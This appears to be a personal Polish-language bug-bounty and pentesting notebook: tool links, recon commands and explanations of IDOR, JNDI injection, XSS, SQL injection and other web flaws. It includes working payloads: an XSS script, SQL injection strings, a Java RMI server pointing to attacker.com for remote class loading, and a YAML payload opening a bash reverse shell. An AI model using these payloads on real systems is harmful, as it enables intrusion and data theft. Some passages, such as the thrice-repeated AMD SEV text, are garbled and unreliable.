eskalacja uprawnień np. windows 11/10, server 2012/20 - https://github.com/BeichenDream/GodPotato


=========================================================
Nowa forma ataku na przekaźnik Windows NTLM wykorzystuje rozproszony system plików MS-DFSNM do przejęcia kontroli nad domeną. link do PoC - https://github.com/Wh04m1001/DFSCoerce

WYTŁUMACZENIE: Przekaźnik Windows NTLM jest mechanizmem uwierzytelniania, który umożliwia użytkownikom korzystanie z zasobów sieciowych. System ten wykorzystuje protokół NTLM (NT LAN Manager) do autoryzacji użytkowników.

Rozproszony system plików MS-DFSNM (Microsoft Distributed File System Namespace Management) służy do zarządzania i udostępniania zasobów plikowych w sieciach rozproszonych. Jest to usługa, która umożliwia tworzenie wirtualnej struktury katalogów, która ukrywa faktyczną lokalizację plików i folderów na serwerach.

Przekaźnik Windows NTLM wykorzystuje rozproszony system plików MS-DFSNM, aby przekierować zapytania uwierzytelniające do właściwych serwerów w sieci. Dzięki temu użytkownicy mogą korzystać z zasobów sieciowych bez konieczności znać ich dokładnej lokalizacji.

W praktyce, kiedy użytkownik próbuje uzyskać dostęp do zasobów sieciowych, przekaźnik Windows NTLM przekierowuje jego zapytanie do serwera MS-DFSNM. Następnie MS-DFSNM sprawdza, gdzie znajdują się właściwe pliki i przekierowuje zapytanie do odpowiedniego serwera w sieci. Po autoryzacji użytkownika, serwer przekazuje odpowiedź do przekaźnika Windows NTLM, który następnie przekazuje ją z powrotem do użytkownika.

Dzięki temu mechanizmowi użytkownicy mogą korzystać z zasobów sieciowych, bez konieczności znajomości ich faktycznej lokalizacji. Rozproszony system plików MS-DFSNM działa jako pośrednik, który zapewnia efektywny dostęp do zasobów sieciowych i ułatwia zarządzanie nimi.
============================================================


ttps://itpracticetest.online
https://dl.acm.org/

https://redteam.guide/docs/checklists/red-team-checklist/
http://redteam.guide/

## zawsze sprawdzać foldery nie ls tylko ls -la -ls

poradnik do narzedzia git https://asciinema.org/a/24072


TLS - https://github.com/projectdiscovery/tlsx

nauka cobalt strike - https://github.com/zer0yu/Awesome-CobaltStrike

classic - https://owasp.org/

gamepwn - https://www.hackthebox.com/blog/intro-to-gamepwn-aka-game-hacking

przydatne polecenia PowerShell:

`powershell -c "Get-Service"`
To polecenie wyświetla listę wszystkich usług uruchomionych w celu Windows. Znajomość usług działających na celu pozwala określić potencjalne wektory ataku. Jako obrońca, użycie tego polecenia ujawnia powierzchnię ataku i może ujawnić potencjalnie złośliwe usługi działające na twoim punkcie końcowym.

`Get-ChildItem -Path C:\ -Include *[FILENAME]* -File -Recurse -ErrorAction SilentlyContinue`
To polecenie pomaga znaleźć lokalizację określonego pliku w miejscu docelowym. Jest to szczególnie przydatne w przypadku zdarzeń przechwytywania flagi (CTF) , gdy ogólnie znasz nazwę flagi, ale możesz nie wiedzieć, gdzie jest przechowywana.

`Get-LocalUser`


hashowanie tekstu przez kali linux, komenda: `echo -n 'MyPassword' | md5sum`

https://www.orangecyberdefense.com/global/blog/ethical-hacking/ethical-hacking-all-about-physical-intrusions


**Wyodrębnianie sekretów z zaszyfrowanych maszyn wirtualnych**:
AMD SEV to sprzętowe rozszerzenie szyfrowania pamięci głównej w systemach z wieloma dzierżawcami. SEV wykorzystuje wbudowany koprocesor, AMD Secure Processor, do przezroczystego szyfrowania pamięci maszyny wirtualnej za pomocą indywidualnych, efemerycznych kluczy, które nigdy nie opuszczają koprocesora. Celem jest ochrona poufności pamięci dzierżawców przed złośliwym lub zagrożonym hypervisorem oraz przed atakami na pamięć, na przykład poprzez zimny rozruch lub DMA. Atak SEVered pokazał, że hiperwizor może jednak wyodrębnić pamięć w postaci zwykłego tekstu z maszyn wirtualnych zaszyfrowanych SEV bez dostępu do ich kluczy szyfrujących. Jednak szyfrowanie utrudnia tradycyjnym technikom introspekcji maszyny wirtualnej lokalizowanie sekretów w pamięci przed wyodrębnieniem. Może to wymagać wyodrębnienia dużej ilości pamięci w celu odzyskania określonych sekretów, a tym samym skutkować czasochłonnym, oczywistym atakiem. Przedstawiamy podejście, które umożliwia złośliwemu hypervisorowi szybką identyfikację i kradzież tajemnic, takich jak klucze TLS, SSH czy FDE, z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# bug bounty

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
rekonesans:
* * *https://securityheaders.com/
* * *https://threatcrowd.org/
* * *https://publicwww.com/
* * *http://ipv4info.com/
* * *https://pentest-tools.com/
* * *netcraft
* * *https://osint.sh/

luki w zabezpieczeniach:
XSS: `<script>alert(document.domain)</script>`
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#

metadane exif nie są usuwane z profilu [POC]: http://exif.regex.info/ 
**Przykład**: https://youtu.be/LtQO4aRpzx8

**atak ddos przez nie ustalenie limitu hasła**

SQL injection przykłąd: `https://test.com/productskategoria=gifty'+OR+1=1--`
panel administratora SQL: `admin' #`

Luka w zabezpieczeniach omijania adresu email:https://youtu.be/ow3lT0Kmi-I

Xmlrpc.php bruteforce: https://youtu.be/r5ToGBIZRI0

NAUKA github/youtube/google:
https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters
https://github.com/EdOverflow/bugbounty-cheatsheet
https://github.com/djadmin/awesome-bug-bounty#getting-started
https://bughunters.google.com/
https://github.com/HolyBugx/HolyTips/tree/main/
https://github.com/CHYbeta/Web-Security-Learning
https://github.com/m0chan/BugBounty

WAZNE NAUKA:
https://github.com/5bhuv4n35h/pentestmindmap
https://github.com/pdelteil/BugBountyReportTemplates
https://github.com/infosecn1nja/AD-Attack-Defense


narzędzia:
* https://github.com/m4ll0k/BBTz
* wfuzz
* dirsearch
* nmap
* burpsuite
* wpscan
*  subzy =  sudo su`subzy -targets /home/kali/Desktop/sql.txt | tee -a subzy.txt` (**komenda**)

najlepsze ze strony https://medium.com/:
https://medium.com/bug-bounty-hunting/coping-up-with-bug-bounty-failures-7d9ca4e6d257
https://medium.com/@santocheung/basic-csrf-8e135c6e2b0d
https://medium.com/@circleninja
https://medium.com/@santocheung/

**ProxyShell składa się z 3 luk**

## Wszystkie luki CVE: https://cve.mitre.org/

## REECON CAŁEJ STRONY:
`cd reconftw`
`sudo proxychains ./reconftw.sh -d NAZWA-STRONA -r` 

znaleziona luka sql https://www.jhaddix.com/post/bug-bounty-hacking-diary-4-8-22

**Pełna metodologia przejęcia subdomeny (narzędzie** **SUBZY**)
https://youtu.be/xQVE3yybti0

KOMENDY: `subzy -target NAZWA SUBDOMENY`

`subzy -targets /home/kali/Desktop/sql.txt | tee -a subzy.txt`

https://medium.com/@nynan/what-i-learnt-from-reading-217-subdomain-takeover-bug-reports-c0b94eda4366

XSStrike:
`XSSTRIKE - proxychains python3 xsstrike.py -u "strona.com/parametr typu id"`

`proychains ./xsstrike.py -u "http://URL/" --crawl`

WSZYSTKIE PRZKŁAY: https://github.com/s0md3v/XSStrike/wiki/Usage

test api: **cd gmascapiscanner**
`python3 maps_api_scanner_python3.py --api-key API`

## **## JAK NAJMNIEJ AUTOMATYZACJI**

domain extractor - https://beautifycode.net/domain-extractor


![2022-04-21 15_21_55-Bug-Bounty-Playbook.pdf — Osobisty — Microsoft​ Edge.png](:/6cf7b6a198d144c7bc51966d27c5f65a)


Jeśli zobaczysz stronę Apache Struts, możesz spróbować niektórych znanych CVE, lista jest długa.
luki w zabezpieczeniach. Na przykład, jeśli widzisz, że witryna korzysta z WordPressa, możesz uruchomić skaner WordPress.


Serwer bazy danych odpowiada za wiele funkcji, w tym za odczytywanie, wyszukiwanie i zapisywanie do bazy danych. Aplikacja internetowa do zakupów online może wymagać dostępu do więcej niż jednej bazy danych, na przykład:

* * ***Baza produktów**: ta baza danych zawiera szczegółowe informacje o produktach, takie jak nazwa, zdjęcia, specyfikacje i cena.
* * ***Baza klientów**: zawiera wszystkie szczegóły związane z klientami, takie jak imię i nazwisko, adres, e-mail i numer telefonu.
* * ***Baza danych sprzedaży:** Oczekujemy, że w tej bazie danych zobaczymy, co kupił każdy klient i jak zapłacił.



Poniższy obraz przedstawia wyszukiwanie produktu w witrynie zakupów online. W najprostszej wersji wyszukiwanie obejmie cztery kroki:


![2022-05-13 21_12_08-SpróbujHackMe _ Bezpieczeństwo aplikacji internetowych.png](:/cfe31d7aa4f64790ba27c80659d9201c)

Użytkownik wprowadza nazwę przedmiotu lub powiązane słowa kluczowe w polu wyszukiwania. Przeglądarka internetowa wysyła słowa kluczowe wyszukiwania do aplikacji internetowej zakupów online.
Aplikacja internetowa przeszukuje (przeszukuje) bazę produktów pod kątem wprowadzonych słów kluczowych.
Baza produktów zwraca wyniki wyszukiwania pasujące do podanych słów kluczowych do aplikacji internetowej.
Aplikacja internetowa formatuje wyniki jako przyjazną stronę internetową i zwraca je użytkownikowi.

![b5459db6d49897741f063cb33711e4c0.png](:/1dcdf4cd165e48eaa7af93fe5e19bff7)

**luka IDOR może wystąpić, jeśli dane wejściowe wzbudziły zbyt duże zaufanie. Innymi słowy, aplikacja internetowa nie sprawdza, czy użytkownik ma uprawnienia dostępu do żądanego obiektu.**

**Rozważmy bardziej krytyczny przykład; adres URL https://store.tryhackme.thm/customers/user?id=16zwróciłby użytkownika z id=16. Ponownie oczekujemy, że użytkownicy będą mieli kolejne numery identyfikacyjne. Atakujący próbowałby wypróbować inne numery i prawdopodobnie uzyskać dostęp do innych kont użytkowników. Ta luka może działać z plikami sekwencyjnymi; na przykład, jeśli atakujący widzi 007.txt, może wypróbować inne liczby, takie jak 001.txt, 006.txti 008.txt**

----------------------------------------------------------------------
**Java Naming and Directory Interface (JNDI) to Java API, które umożliwia klientom wykrywanie i wyszukiwanie danych i obiektów za pomocą nazwy. Obiekty te mogą być przechowywane w różnych usługach nazewniczych lub katalogowych, takich jak Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP) lub Domain Name Service (DNS).**
**Innymi słowy, JNDI jest prostym interfejsem API Java (takim jak „InitialContext.lookup(String name)” ), który przyjmuje tylko jeden parametr ciągu, a jeśli ten parametr pochodzi z niezaufanego źródła, może prowadzić do zdalnego wykonania kodu przez zdalną klasę Ładowanie.**
**Kiedy nazwa żądanego obiektu jest kontrolowana przez atakującego, możliwe jest skierowanie ofiary aplikacji Java do złośliwego serwera rmi/ldap/corba i odpowiedź z dowolnym obiektem. Jeśli ten obiekt jest instancją klasy „javax.naming.Reference”, klient JNDI próbuje rozpoznać atrybuty „classFactory” i „classFactoryLocation” tego obiektu. Jeśli wartość „classFactory” jest nieznana docelowej aplikacji Java, Java pobiera kod bajtowy fabryki z lokalizacji „classFactoryLocation” za pomocą URLClassLoader Java.**

Przykłąd podatnej aplikacji:
```
@RequestMapping("/lookup")
	@Example(uri = {"/lookup?name=java:comp/env"})
	public Object lookup(@RequestParam String name) throws Exception{
	    return new javax.naming.InitialContext().lookup(name);
	}
```

Wykorzystanie wstrzyknięć JNDI przed JDK 1.8.0_191
Żądając adresu URL „/lookup/?name=ldap://127.0.0.1:1389/Object” możemy sprawić, że podatny serwer połączy się z naszym kontrolowanym adresem. Aby wyzwolić zdalne ładowanie klasy, złośliwy serwer RMI może odpowiedzieć za pomocą następującego odniesienia:

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
  ```
//creating a reference with 'ExportObject' factory with the factory location of 'http://_attacker.com_/'
        Reference ref = new javax.naming.Reference("ExportObject","ExportObject","http://_attacker.com_/");
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```
Ponieważ "ExploitObject" jest nieznany serwerowi docelowemu, jego kod bajtowy zostanie załadowany i wykonany z " http://_attacker.com_/ExploitObject.class ", wyzwalając RCE.
---------------------------------------------------
Luka IDOR może wystąpić, gdy serwer sieciowy otrzymuje dane wejściowe dostarczone przez użytkownika w celu pobrania obiektów (plików, danych, dokumentów), a do tych danych 
wejściowych zostało zbyt duże zaufanie, a aplikacja sieciowa nie weryfikuje, czy użytkownik powinien, w mieć dostęp do żądanego obiektu

Komponent zapytania:
Dane komponentu zapytania są przekazywane w adresie URL podczas wysyłania zapytania do strony internetowej. Weźmy na przykład poniższy zrzut ekranu adresu URL.

![96ca5139d906961178a2ef917850f96d.png](:/c5e8025f1d634882875987cfa2b44bde)

- Protokół:  https://
- Domena: website.thm
- Strona:  /profil
- Komponent zapytania:  id=23

Zmienne postu:

Badanie zawartości formularzy na stronie internetowej może czasami ujawnić pola, które mogą być podatne na wykorzystanie IDOR. Weźmy na przykład poniższy kod HTML dla formularza, który aktualizuje hasło użytkownika.

```
<form method="POST" action="/update-password">
   <input type="hidden" name"user_id" value="123">
    <div>New Password:</div>
    <div><input type="password" name="new_password"></div>
    <div><input type="submit" value="Change Password">
</form>
```

Z podświetlonej linii widać(input type="hidden" name"user_id" value="123">), że identyfikator użytkownika jest przekazywany do serwera WWW w ukrytym polu Zmiana wartości tego pola z 123 na inny user_id może skutkować zmianą hasła do konta innego użytkownika/

omijanie autoryzacji 403:
narzędzie: byp4xx
komenda - proxychains python3 ./byp4xx.py -fuzz https://example.com/

https://github.com/swisskyrepo/PayloadsAllTheThings

nikto -host example.com

Niebezpieczne parsowanie YAML może umożliwić tworzenie obiektów Pythona i w rezultacie zdalne wykonanie kodu:
`!!python/object/apply:os.system ["bash -i >& /dev/tcp/yourIP/4444 0>&1"]`

dirbuster -u http://10.10.23.135 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

https://www.immuniweb.com

https://kalilinuxtutorials.com/subfinder/ (DOCKER)



-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
wykonanie polecenia¶
Gdy aplikacja musi wywołać zewnętrzne programy w celu przetworzenia treści, użyje niektórych funkcji do wykonania poleceń systemowych. systemNa przykład , exec, itp. w PHP shell_exec, gdy użytkownik może kontrolować parametry funkcji wykonywania poleceń, złośliwe polecenia systemowe mogą zostać wstrzyknięte do zwykłych poleceń, co skutkuje atakami polegającymi na wykonywaniu poleceń. Tutaj skupiamy się głównie na PHP, aby wprowadzić luki w wykonywaniu poleceń, a szczegóły dotyczące Javy i innych aplikacji mają zostać dodane.

plik zawiera¶
Jeśli klientowi zezwoli się na wprowadzanie i kontrolowanie plików dynamicznie umieszczanych na serwerze, doprowadzi to do wykonania złośliwego kodu i ujawnienia poufnych informacji, w tym głównie dwóch form dołączania plików lokalnych i dołączania plików zdalnych.

CSRF Fałszowanie żądań między witrynami¶
Cross-Site Request Forgery (CSRF) to atak, który powoduje, że zalogowany użytkownik wykonuje akcję bez jego wiedzy. Ponieważ atakujący nie może zobaczyć wyniku odpowiedzi na sfałszowane żądanie, ataki CSRF służą przede wszystkim do wykonywania działań, a nie do kradzieży danych użytkownika. Gdy ofiarą jest zwykły użytkownik, CSRF może realizować operacje takie jak przelewanie środków użytkownika i wysyłanie e-maili bez jego wiedzy, ale jeśli ofiarą jest użytkownik z uprawnieniami administratora, CSRF może zagrozić bezpieczeństwu całego systemu WEB.

Fałszowanie żądań po stronie serwera SSRF¶
SSRF (Server-Side Request Forgery: fałszowanie żądań po stronie serwera) to luka w zabezpieczeniach stworzona przez atakującego w celu utworzenia żądania zainicjowanego przez serwer. Zazwyczaj ataki SSRF są ukierunkowane na systemy wewnętrzne, które są niedostępne z sieci zewnętrznej.

Udostępnianie pliku¶
W trakcie działania serwisu nieunikniona jest aktualizacja niektórych stron lub treści serwisu, w tym czasie konieczne jest skorzystanie z funkcji przesyłania plików serwisu. Jeśli przesyłane pliki nie są objęte ograniczeniami lub ograniczenia są pomijane, funkcja ta może służyć do przesyłania plików wykonywalnych i skryptów na serwer, co dodatkowo spowoduje awarię serwera.

przechwytywanie kliknięć¶
Clickjacking został zapoczątkowany w 2008 roku przez ekspertów ds. Bezpieczeństwa internetowego Roberta Hansena i Jeremiaha Glusmana.

Jest to wizualna metoda oszustwa.Po stronie WEB ramka iframe zagnieżdża przezroczystą i niewidoczną stronę, umożliwiając użytkownikowi kliknięcie pozycji, w której atakujący chce oszukać użytkownika, aby kliknął bez wiedzy.

Ze względu na pojawienie się clickjackingu istnieje metoda zagnieżdżania zapobiegająca ramkom, ponieważ clickjacking wymaga do ataku zagnieżdżonych stron iframe.

Poniższy kod jest najczęstszym przykładem zapobiegania zagnieżdżaniu ramek:


if(top.location!=location)
    top.location=self.location;
Wirtualny prywatny serwer VPS¶
Technologia VPS (Virtual Private Server) to wysokiej jakości usługa, która dzieli serwer na wiele wirtualnych serwerów prywatnych. Technologia realizacji VPS dzieli się na technologię kontenerową i technologię wirtualizacji. W kontenerze lub maszynie wirtualnej każdemu VPS można przypisać niezależny publiczny adres IP, niezależny system operacyjny i przeprowadzić izolację miejsca na dysku, pamięci, zasobów procesora, procesów i konfiguracji systemu między różnymi VPS, symulując wyłączne użycie do użytkownicy i aplikacje Doświadczenie w korzystaniu z zasobów obliczeniowych. Podobnie jak samodzielny serwer, VPS może samodzielnie przeinstalować system operacyjny, zainstalować programy i zrestartować serwer. VPS zapewnia użytkownikom swobodę zarządzania i konfiguracji oraz może być używany do wirtualizacji przedsiębiorstwa i dzierżawy zasobów IDC.

Dzierżawa zasobów IDC zapewniana przez dostawcę VPS. Ze względu na różnice w sprzęcie, oprogramowaniu VPS i strategiach sprzedaży stosowanych przez różnych dostawców VPS, doświadczenie korzystania z VPS jest również zupełnie inne. Szczególnie, gdy dostawca VPS jest wyprzedany, a serwer fizyczny jest przeciążony, wydajność VPS będzie znacznie ograniczona. Relatywnie rzecz biorąc, technologia kontenerowa jest bardziej wydajna pod względem wykorzystania sprzętu niż technologia maszyn wirtualnych i łatwiej jest ją przecenić, więc ogólnie rzecz biorąc, cena VPS kontenerowego jest niższa niż VPS maszyny wirtualnej.

konkurs warunkowy¶
Warunkowa luka w zabezpieczeniach konkurencji jest luką po stronie serwera.Ponieważ po stronie serwera przetwarzane są żądania różnych użytkowników jednocześnie, jeśli współbieżność nie jest odpowiednio obsługiwana lub logiczna sekwencja powiązanych operacji nie jest odpowiednio zaprojektowana, takie problemy wystąpią.

XXE¶
XXE Injection oznacza XML External Entity Injection, znany również jako XML External Entity Injection Attack.Luka w zabezpieczeniach to problemy z bezpieczeństwem powstające podczas przetwarzania niezabezpieczonych danych podmiotu zewnętrznego.

W standardzie XML 1.0 pojęcie bytu (podmiotu) jest zdefiniowane w strukturze dokumentu XML. Podmiot można wywołać w dokumencie poprzez predefiniowanie, a identyfikator podmiotu może uzyskać dostęp do treści lokalnych lub zdalnych. Jeśli „zanieczyszczenie „Wprowadza się w tym procesie” źródło, po przetworzeniu dokumentu XML, może to prowadzić do problemów związanych z bezpieczeństwem, takich jak wyciek informacji.

XSCH¶
Ze względu na zaniedbania twórców stron internetowych w procesie tworzenia z wykorzystaniem Flasha, Silverlight itp., problem wystąpił z powodu braku poprawnej konfiguracji pliku zasad międzydomenowych (crossdomain.xml). Na przykład:


<cross-domain-policy>
    <allow-access-from domain=“*”/>
</cross-domain-policy>
Ponieważ plik zasad międzydomenowych jest skonfigurowany jako *, oznacza to, że Flash w dowolnej domenie może z nim wchodzić w interakcje, co daje możliwość inicjowania żądań i uzyskiwania danych.

Overreach (brak dostępu na poziomie funkcji)¶
Luka w zabezpieczeniach umożliwiająca naruszenie uprawnień jest powszechną luką w zabezpieczeniach aplikacji WEB. Jego zagrożenie polega na tym, że jedno konto może kontrolować dane użytkowników całej witryny. Oczywiście dane te są ograniczone do danych odpowiadających funkcjom z lukami. Główną przyczyną nieautoryzowanej luki w zabezpieczeniach jest to, że programista nadmiernie ufał danym żądanym przez klienta podczas dodawania, usuwania, modyfikowania i wysyłania zapytań do danych i nie trafił w osąd organu. Dlatego testowanie nieautoryzowanego dostępu to proces ciężkiej pracy z programistami.

Wyciek wrażliwych informacji¶
Informacje wrażliwe odnoszą się do informacji, które nie są znane opinii publicznej, mają rzeczywistą i potencjalną wartość użytkową i wyrządzają szkodę społeczeństwu, przedsiębiorstwom lub osobom fizycznym w przypadku ich utraty, niewłaściwego wykorzystania lub uzyskania do nich dostępu bez zezwolenia. W tym: informacje dotyczące prywatności, informacje dotyczące działalności biznesowej, informacje finansowe, informacje dotyczące personelu, informacje dotyczące obsługi i konserwacji IT itp. Kanały wycieku obejmują Github, bibliotekę Baidu, kod Google, katalogi stron internetowych itp.

zła konfiguracja zabezpieczeń¶
Błędna konfiguracja zabezpieczeń: czasami użycie domyślnej konfiguracji zabezpieczeń może narazić aplikację na wiele ataków. Bardzo ważne jest, aby istniejące najlepsze konfiguracje zabezpieczeń były używane we wdrożonych aplikacjach, serwerach WWW, serwerach baz danych, systemach operacyjnych, bibliotekach kodu i wszystkich komponentach związanych z aplikacjami.

zażądać przemytu¶
W protokole HTTP istnieją dwa nagłówki określające koniec żądania, a mianowicie Content-Length i Transfer-Encoding. W złożonym środowisku sieciowym różne serwery wdrażają standardy RFC na różne sposoby. W związku z tym dla tego samego żądania HTTP różne serwery mogą generować różne wyniki przetwarzania, co stwarza zagrożenie dla bezpieczeństwa.

zatrucie TLS¶
W protokole TLS istnieje mechanizm multipleksowania sesji. Gdy klient obsługujący ten typ funkcji uzyskuje dostęp do złośliwego serwera TLS, klient przechowuje sesję wysłaną przez złośliwy serwer. Gdy klient ponownie wykorzystuje sesję, DNS Rebinding może zrealizować pozwalając klient wysyła złośliwe Sesje do usług intranetowych, osiągając w ten sposób efekt ataków SSRF, w tym możliwość dowolnego zapisu do usług intranetowych, takich jak Memcached, a następnie współpracuje z innymi lukami w celu spowodowania RCE i innych zagrożeń.

XS-przecieki¶
Wycieki typu cross-site scripting (znane również jako XS-Leaks/XSLeaks) to rodzaj luki wywodzącej się z wbudowanego kanału bocznego platformy internetowej. Zasada polega na wykorzystaniu tego bocznego kanału w sieci do ujawnienia poufnych informacji o użytkowniku, takich jak dane użytkownika w innych aplikacjach sieciowych, informacje o lokalnym środowisku użytkownika lub informacje o sieci wewnętrznej, z którą użytkownik jest połączony.

Atak wykorzystuje podstawową zasadę platformy internetowej — możliwość komponowania, która umożliwia stronom interakcję ze sobą i nadużywanie legalnych mechanizmów w celu uzyskania informacji o użytkownikach. Główna różnica między tym atakiem a technologią cross-site request forgery (CSRF) polega na tym, że XS-Leaks nie fałszuje żądań użytkownika w celu wykonania operacji, ale jest używany do wnioskowania i uzyskiwania informacji o użytkowniku.

Przeglądarki udostępniają różnorodne funkcje wspierające interakcję między różnymi aplikacjami internetowymi; na przykład przeglądarki umożliwiają jednej stronie ładowanie podzasobów, nawigację lub wysyłanie wiadomości do innej aplikacji. Podczas gdy te zachowania są zwykle ograniczone przez mechanizmy bezpieczeństwa platform internetowych (takie jak polityka tego samego pochodzenia), XS-Leaks wykorzystuje różne zachowania podczas interakcji między stronami internetowymi w celu ujawnienia informacji o użytkownikach.

WAF¶
System ochrony aplikacji internetowych (znany również jako: system zapobiegania włamaniom na poziomie aplikacji internetowej. Angielski: Web Application Firewall, dalej: WAF). Używając uznanego na całym świecie stwierdzenia: Zapora aplikacji WEB to produkt, który zapewnia ochronę aplikacji WEB poprzez wdrożenie szeregu zasad bezpieczeństwa dla HTTP/HTTPS.

IDS¶
IDS to skrót od Intrusion Detection Systems w języku angielskim i oznacza „Intrusion Detection System” w języku chińskim. Profesjonalnie rzecz biorąc, zgodnie z określoną strategią bezpieczeństwa, za pomocą oprogramowania i sprzętu, monitoruj stan działania sieci i systemu oraz wykrywaj różne próby ataków, zachowania ataków lub wyniki ataków w jak największym stopniu, aby zapewnić poufność i integralność zasoby systemu sieciowego i dostępność. Zrób metaforę obrazu: jeśli zapora ogniowa jest zamkiem w drzwiach budynku, to system IDS jest systemem monitoringu w tym budynku. Gdy złodziej wejdzie do budynku przez okno lub osoba z wewnątrz przekroczy granicę, tylko system monitoringu w czasie rzeczywistym może wykryć sytuację i wydać ostrzeżenie.

IPS¶
Intrusion Prevention System (IPS: Intrusion Prevention System) to narzędzie zabezpieczające sieć komputerową oraz uzupełnienie oprogramowania antywirusowego (programy antywirusowe) i zapory ogniowej (Filtr pakietów, Application Gateway). System zapobiegania włamaniom (system zapobiegania włamaniom) to urządzenie zabezpieczające sieć komputerową, które może monitorować zachowanie transmisji danych sieciowych w sieci lub sprzęcie sieciowym i może natychmiast przerywać, dostosowywać lub izolować niektóre nieprawidłowe lub szkodliwe zachowania transmisji danych w sieci.
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


DIRSEARCH -  dirsearch -u 10.10.120.28  -e / -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50/lub 10 -b -r -f

subdomains - https://subdomains.whoisxmlapi.com/


Podczas przesyłania pliku do „partners.line.me” z nazwą pliku zawierającą ładunek XSS, serwer nie zmienił nazwy pliku. To spowodowało, że XSS oparty na DOM został osadzony w HTML. Przesłane pliki były przechowywane tylko przez określony czas. Jednak dopóki były dostępne na serwerze, dostęp do ścieżki wyzwalał XSS, a zapisany ładunek był wyświetlany bez ucieczki. Okazało się jednak, że kradzież ciasteczek nie jest możliwa.


Self XSS To xss który widzisz tylko ty.
Przykład - https://whitton.io/articles/uber-turning-self-xss-into-good-xss/

Wydaję mi się że ładunek xss w plkach lub zdjęciach jest w ten sposób przesyłany. Włączony Burp Suite --> Wysłanie norlamnego pliku/Zdjęcia na stronę --> Przechwycenie żądania i zmienienie nazwy pliku na payload XSS
https://whitton.io/articles/xss-on-facebook-via-png-content-types/

NAUKA - https://www.hacksplaining.com/
                https://www.amanhardikar.com/mindmaps/Practice.html
				https://forum.bugcrowd.com/t/researcher-resources-tutorials/370
				https://www.reddit.com/r/netsec/

https://forum.bugcrowd.com/t/researcher-resources-bounty-bug-write-ups/1137
				
https://www.bugcrowd.com/blog/getting-started-bug-bounty-hunter-methodology/
				
https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102

dns tool - https://code.google.com/archive/p/dns-discovery/

https://dnsdumpster.com/


przesyłanie odwróconej powłoki do witryny w miejscu gdzie jest przeznaczone przesyłanie zdjęć:

mogę przesłać plik img, png. Mogę zmienić rozszerzenie na .php7.

Nie mogę po prostu przesłać pliku .php7, ale działa to, gdy konwertuję zwykły plik jpg na plik .php7

https://github.com/sAjibuu/upload_bypass
///Najprawdopodobniej po stronie serwera sprawdzają, czy jest to obraz. Użyj edytora szesnastkowego i umieść odpowiednie tagi w kodzie. Po prostu google i eksperymentuj. Następnie możesz zrobić dowolne rozszerzenie.\\\

-----------------------------------------------------------------------
## **RECON**
Koncepcje tła
Poziomy są ważną koncepcją dla tego dokumentu i dla PTES jako całości. Jest to swego rodzaju model dojrzałości dla pentestów. Definiowanie poziomów pozwala nam sprecyzować oczekiwane wyniki i działania w ramach pewnych rzeczywistych ograniczeń, takich jak czas, wysiłek, dostęp do informacji itp.

Poziomy zbierania danych wywiadowczych są obecnie podzielone na trzy kategorie, a dla każdej z nich podano typowy przykład. Powinny one kierować dodawaniem technik w poniższym dokumencie. Na przykład intensywna czynność, taka jak utworzenie profilu na Facebooku i analiza sieci społecznościowej celu, jest odpowiednia w bardziej zaawansowanych przypadkach i powinna być oznaczona odpowiednim poziomem. Zobacz mapę myśli poniżej, aby zobaczyć przykłady.

Zbieranie informacji poziomu 1
(pomyśl: Napędzany zgodnością) Głównie proces zbierania informacji za pomocą kliknięcia przycisku. Ten poziom informacji można uzyskać prawie wyłącznie za pomocą zautomatyzowanych narzędzi. Absolutne minimum, aby powiedzieć, że zrobiłeś IG dla PT.

Acme Corporation musi być zgodna z PCI / FISMA / HIPAA. Wysiłek w zakresie gromadzenia informacji na poziomie 1 powinien być odpowiedni do spełnienia wymogu zgodności.

Zbieranie informacji na poziomie 2
(pomyśl: najlepsza praktyka) Ten poziom można utworzyć za pomocą zautomatyzowanych narzędzi z poziomu 1 i ręcznej analizy. Dobre zrozumienie firmy, w tym informacji, takich jak fizyczna lokalizacja, relacje biznesowe, schemat organizacyjny itp.

Firma Widgets Inc musi działać zgodnie z PCI, ale jest zainteresowana długoterminową strategią bezpieczeństwa i przejmuje kilku mniejszych producentów widżetów. Wysiłek w zakresie gromadzenia informacji na poziomie 2 powinien być odpowiedni do ich potrzeb.

Zbieranie informacji na poziomie 3
